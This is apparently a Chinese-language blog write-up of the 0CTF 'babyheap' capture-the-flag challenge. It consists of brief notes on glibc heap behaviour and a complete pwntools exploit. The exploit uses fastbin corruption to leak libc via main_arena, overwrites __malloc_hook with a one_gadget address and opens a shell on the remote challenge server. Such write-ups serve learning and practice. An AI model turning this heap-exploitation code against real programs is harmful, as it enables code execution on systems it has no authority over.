---
title: 0CTF-babyheap题解
date: 2018-11-21 23:18:18
tags: 题目
---
<h1><strong>知识点</strong></h1>
1.small chunk释放时候fd bk指到main_arena的0x58出 main_arena存在libc段
2.small chunk加入fastbin时候需要修改size位过检测
3.malloc_hook检测申请堆 平常0 不为0先执行里面的内容

<h1><strong>exp</strong></h1>

```python
#!/usr/bin/python
# -*- coding: utf-8 -*-
from pwn import *

io = remote("119.29.221.116",10000)
#io = process('./0ctfbabyheap')
#elf = ELF('./0ctfbabyheap')
#context.log_level = 'debug'

#申请堆
def alloc(size):
  io.recvuntil("Command: ")
  io.sendline('1')
  io.recvuntil("Size: ")
  io.sendline(str(size))

#写入堆
def fill(index,content):
  io.recvuntil("Command: ")
  io.sendline('2')
  io.recvuntil("Index: ")
  io.sendline(str(index))
  io.recvuntil("Size: ")
  io.sendline(str(len(content)))
  io.recvuntil("Content: ")
  io.send(content)

#释放堆
def free(index):
  io.recvuntil("Command: ")
  io.sendline('3')
  io.recvuntil("Index: ")
  io.sendline(str(index))

#dump内容
def dump(index):
    io.recvuntil("Command: ")
    io.sendline('4')
    io.recvuntil("Index: ")
    io.sendline(str(index))
    io.recvuntil("Content: \n")
    data = io.recvline()
    return data

#chunk0 chunk1 chunk2 chunk3 ->fastbin
alloc(0x10)
alloc(0x10)
alloc(0x10)
alloc(0x10)
#chunk4 -> small chunk
alloc(0x80)

#free掉chunk1 chunk2
free(1)
free(2)

#从chunk0开始去覆盖 修改chunk2的fd指针 指向我们的small chunk
payload  = "A"*16
payload += p64(0) + p64(0x21) + "A"*16
payload += p64(0) + p64(0x21) + p8(0x80) 
#修改一字节为0x80 因为地址就差在后一字节上
fill(0, payload)

#为通过fastbin检验 修改small chunk的size位
payload  = "A"*16
payload += p64(0) + p64(0x21)
fill(3, payload)

#第一次申请small chunk加入fastbin
alloc(0x10)
#第二次申请就是small chunk 此时(chunk 2 chunk 4重合)
alloc(0x10)

#将small chunk的size修改回来 为了后面的free
payload  = "A"*16
payload += p64(0) + p64(0x91)
fill(3, payload)

#防止free的small chunk合并到top chunk 再申请一个small chunk
alloc(0x80)

#free掉small chunk 其fd bk 指向 main_arena的0x58处
free(4)
#gdb.attach(io)

#得到leak地址
leak = u64(dump(2)[:8])
#0x3c4b78是可以自己计算出来 libc.so起始地址-main_arena地址-0x58
libc = leak - 0x3c4b78
#one_gadget one_gadget自己搜索
one_gadget = libc + 0x4526a

#需要一个fastbin去指向我们的fake chunk
alloc(0x60)
free(4)

#使free掉的chunk fd指向fake chunk
#fake chunk地址在malloc_hook地址附近 自己随便找一块
payload = ''
payload += p64(libc+0x3c4afd)
fill(2,payload)

#连续申请两次 第二次就是fake chunk地方
alloc(0x60)
alloc(0x60)

#通过fake chunk偏移去把one_gadget写入malloc_hook
payload = ''
payload += p8(0)*3
payload += p64(one_gadget)
fill(6,payload)

#再次调用alloc() 触发malloc_hook中地址
alloc(1)
io.interactive()
```
